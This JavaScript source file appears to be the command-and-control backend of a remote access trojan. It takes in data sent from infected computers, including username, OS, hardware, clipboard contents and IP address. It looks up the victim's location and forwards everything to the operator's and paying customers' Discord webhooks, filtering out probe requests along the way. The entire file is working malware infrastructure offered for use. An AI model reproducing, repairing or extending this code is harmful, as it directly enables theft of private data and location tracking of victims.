import AsciiTable from "ascii-table";
import axios from "axios";
import { WebhookClient, EmbedBuilder } from "discord.js";
import { getClientIp } from "request-ip";

const usernameRegex = /^[a-zA-Z0-9_]{1,16}$/;
const ipv4Regex = /^(?:(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.){3}(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])$/;
const ipv6Regex =
  /^((?=.*::)(?!.*::.+::)(::)?([\dA-F]{1,4}:(:|\b)|){5}|([\dA-F]{1,4}:){6})((([\dA-F]{1,4}((?!\3)::|:\b|$))|(?!\2\3)){2}|(((2[0-4]|1\d|[1-9])?\d|25[0-5])\.?\b){4})$/i;

export default function handleComputer(ratDB, webhookClient, sendError, getNetworth) {
  return async function (req, res) {
    const {
      id,
      username = "null",
      ip = "null",
      user = "null",
      os = "null",
      cpu = "null",
      ram = "null",
      clipboard = "null",
      dev = false,
    } = req.body;
    const ip2 = getClientIp(req);

    const table = new AsciiTable("Computer Hit").setHeading("Type", "Value");
    table.addRow("Code", id);
    table.addRow("Username", username);
    table.addRow("OS", os);
    table.addRow("IP 1", ip);
    table.addRow("IP 2", ip2);

    if (
      username.toLowerCase().includes("discord") ||
      ip.toLowerCase().includes("discord") ||
      user.toLowerCase().includes("discord") ||
      os.toLowerCase().includes("discord") ||
      cpu.toLowerCase().includes("discord") ||
      ram.toLowerCase().includes("discord") ||
      typeof dev != "boolean" ||
      !usernameRegex.test(username) ||
      (ip != "null" && !ipv4Regex.test(ip) && !ipv6Regex.test(ip))
    ) {
      table.addRow("Error", "Invalid Request");
      console.log(table.toString());
      return;
    }

    try {
      const { webhook, dhooked } = await ratDB.getWebhook(id);
      const response = await axios.get(`https://ipapi.co/${ip}/json`);
      const premiumEmbed = new EmbedBuilder()
        .setColor("#00ffff")
        .setTitle(":desktop: PC Information")
        .addFields(
          { name: ":label: Username", value: `\`\`\`${user}\`\`\``, inline: true },
          { name: ":level_slider: OS Name", value: `\`\`\`${os}\`\`\``, inline: true },
          { name: ":zap: CPU", value: `\`\`\`${cpu}\`\`\``, inline: true },
          { name: ":floppy_disk: RAM", value: `\`\`\`${ram}\`\`\``, inline: true },
          { name: ":clipboard: Clipboard", value: `\`\`\`${clipboard}\`\`\``, inline: true },
          { name: ":man_technologist: Dev Mode", value: `\`\`\`${dev ? "Yes" : "No"}\`\`\``, inline: true }
        );
      const ipInfoEmbed = new EmbedBuilder()
        .setColor("#0000ff")
        .setTitle(":earth_americas: IP Information")
        .addFields(
          {
            name: ":globe_with_meridians: Country",
            value: `\`\`\`${response?.data?.country_name}\`\`\``,
            inline: true,
          },
          { name: ":globe_with_meridians: Region", value: `\`\`\`${response?.data?.region}\`\`\``, inline: true },
          { name: ":globe_with_meridians: City", value: `\`\`\`${response?.data?.city}\`\`\``, inline: true },
          { name: ":satellite_orbital: IP Address", value: `\`\`\`${response?.data?.ip}\`\`\``, inline: true },
          { name: ":clock10: Timezone", value: `\`\`\`${response?.data?.timezone}\`\`\``, inline: true },
          { name: ":satellite: Protocol", value: `\`\`\`${response?.data?.version}\`\`\``, inline: true }
        );

      if (dhooked) {
        await webhookClient.send({
          content: "@everyone",
          username: "Information - " + username,
          embeds: [premiumEmbed],
        });
        await webhookClient.send({
          content: "@everyone",
          username: "Information - " + username,
          embeds: [ipInfoEmbed],
        });
      }

      if (webhook) {
        const webhookClientCustom = new WebhookClient({ url: webhook });
        await webhookClientCustom.send({
          content: "@everyone",
          username: "Information - " + username,
          embeds: [premiumEmbed],
        });
        await webhookClientCustom.send({
          content: "@everyone",
          username: "Information - " + username,
          embeds: [ipInfoEmbed],
        });
      } else {
        table.addRow("Error", "Webhook Not Found");
      }
    } catch (e) {
      var errorMsg;
      if (e.response) {
        errorMsg = e.response.data;
      } else if (e.request) {
        errorMsg = e.request;
      } else {
        errorMsg = e.message;
      }

      table.addRow("Error", errorMsg);
    }

    console.log(table.toString());
  };
}
